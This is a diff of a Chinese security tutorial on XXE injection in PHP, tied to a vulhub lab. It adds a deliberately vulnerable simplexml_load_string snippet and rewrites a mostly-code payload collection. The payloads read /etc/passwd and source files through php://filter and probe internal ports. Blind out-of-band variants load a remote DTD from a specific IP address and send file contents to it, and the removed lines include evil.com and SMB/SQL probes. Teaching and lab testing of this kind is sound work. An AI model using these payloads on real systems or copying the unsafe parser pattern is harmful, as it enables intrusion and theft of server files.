@@ -13,83 +13,106 @@ XML文件作为配置文件(spring、Struts2等)、文档结构说明文件(PDF�
 
 外部引用时可能会出现XXE漏洞，XXE漏洞是针对使用XML交互的Web应用程序的攻击方法
 
-### 0x03 XXE漏洞读取文件
+### 0x01 示例代码
+实验环境：[https://github.com/vulhub/vulhub/tree/master/php/php_xxe](https://github.com/vulhub/vulhub/tree/master/php/php_xxe?_blank)  
+simplexml_load_string.php
+```
+<?php
+$data = file_get_contents('php://input');
+$xml = simplexml_load_string($data);
+echo $xml->name;
+```
+
+### 0x02 读取文件
+* 内部声明实体
+
 ```
 <?xml version="1.0" encoding="utf-8"?> 
 <!DOCTYPE xdsec [
   <!ELEMENT name ANY >
-  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
-<root>
-  <name>&xxe;</name>
-</root>
-```
-```
-<?xml version="1.0" encoding="utf-8"?> 
-<!DOCTYPE xdsec [
-  <!ELEMENT name ANY >
-  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php" >]>
-<root>
-  <name>&xxe;</name>
-</root>
-```
-```
-<?xml version="1.0"?>
-<!DOCTYPE a [
-  <!ENTITY % d SYSTEM "http://evil.com/evil.dtd" >
-  %d;
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
 ]>
-<test>&b;</test>
-
-evil.dtd中的内容为：<!ENTITY b SYSTEM "file:///etc/passwd" >
-```
-<br>
-```xml
-<?xml version="1.0"?>
-<!DOCTYPE a SYSTEM "http://evil.com/evil.dtd">
-<test>&b;</test>
-
-evil.dtd中的内容为：<!ENTITY b SYSTEM "file:///etc/passwd" >
+<root>
+  <name>&xxe;</name>
+</root>
 ```
 
-* 扫描内网
-
-```xml
-<!ENTITY portscan SYSTEM 'http://192.168.2.22:6379/'>
-<!ENTITY smb SYSTEM '\\192.168.2.22\C$'>
-<!ENTITY sqli SYSTEM 'http://192.168.2.22/a.php?id=-1+union+select+1,2,3--'>
+```
+<?xml version="1.0" encoding="utf-8"?> 
+<!DOCTYPE xdsec [
+  <!ELEMENT name ANY >
+  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
+]>
+<root>
+  <name>&xxe;</name>
+</root>
 ```
 
-* Blind-XXE
+* 引用外部实体
+
+evil.dtd中的内容为：```<!ENTITY b SYSTEM "file:///etc/passwd">```
+```
+<?xml version="1.0" encoding="utf-8"?> 
+<!DOCTYPE xdsec [
+  <!ELEMENT name ANY >
+  <!ENTITY % xxe SYSTEM "http://114.115.183.86/evil.dtd">
+  %xxe;
+]>
+<root>
+  <name>&b;</name>
+</root>
+```
+
+### 0x03 端口探测
+```
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE xdsec [
+  <!ENTITY http SYSTEM 'http://10.11.11.20:3306/'>
+]>
+<root>
+  <name>&http;</name>
+</root>
+```
+
+### 0x04 Blind-XXE
+* 方法一：
+
+```
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE xdsec [
+    <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/issue">
+    <!ENTITY % remote SYSTEM "http://114.115.183.86/wyb/evil.dtd">
+    %remote;
+    %send;
+]>
+```
+evil.dtd内容：
+```
+<!ENTITY % all
+"<!ENTITY &#x25; send SYSTEM 'http://114.115.183.86/?%file;'>"
+>
+%all;
+```
+
+* 方法二：
 
 ```xml
 <?xml version="1.0" encoding="utf-8"?>
-<!DOCTYPE root [
-    <!ENTITY % ttt SYSTEM "php://filter/convert.base64-encode/resource=/flag">
-    <!ENTITY % remote SYSTEM "http://Your IP/evil.xml">
+<!DOCTYPE xdsec [
+    <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/hosts">
+    <!ENTITY % remote SYSTEM "http://114.115.183.86/wyb/evil.xml">
     %remote;   <!--引用remote来将外部文件evil.xml引入到解释上下文中-->
-    %payload;   <!--执行%payload，这时会检测到send实体，然后在root节点中引用send，就可以成功实现数据转发-->
+    %xxe;   <!--执行%xxe，这时会检测到send实体，然后在root节点中引用send，就可以成功实现数据转发-->
 ]>
 <root>&send;</root>
-
-<!--evil.xml内容：-->
-<!ENTITY % payload "<!ENTITY % send SYSTEM 'http://Your IP/a.php?content=%ttt;'>">
 ```
-<br>
-```xml
-<?xml version="1.0"?>  
-<!DOCTYPE ANY[  
-    <!ENTITY % file SYSTEM "file:///C:/1.txt">  
-    <!ENTITY % remote SYSTEM "http://192.168.150.1/evil.xml">  
-    %remote;  
-    %all;  
-    %send;  
-]>
-
-<!--evil.xml内容：-->
-<!ENTITY % all "<!ENTITY % send SYSTEM 'http://192.168.150.1/1.php?file=%file;'>">
+evil.xml内容：
 ```
+<!ENTITY % xxe "<!ENTITY send SYSTEM 'http://114.115.183.86/a.php?content=%file;'>">
+```
+
 
 <br>
 #### Reference(侵删)：
-* [http://blog.csdn.net/u011721501/article/details/43775691](http://blog.csdn.net/u011721501/article/details/43775691)
-* [https://www.waitalone.cn/xxe-attack.html](https://www.waitalone.cn/xxe-attack.html)
+* [http://blog.csdn.net/u011721501/article/details/43775691](http://blog.csdn.net/u011721501/article/details/43775691?_blank)
+* [https://security.tencent.com/index.php/blog/msg/69](https://security.tencent.com/index.php/blog/msg/69?_blank)
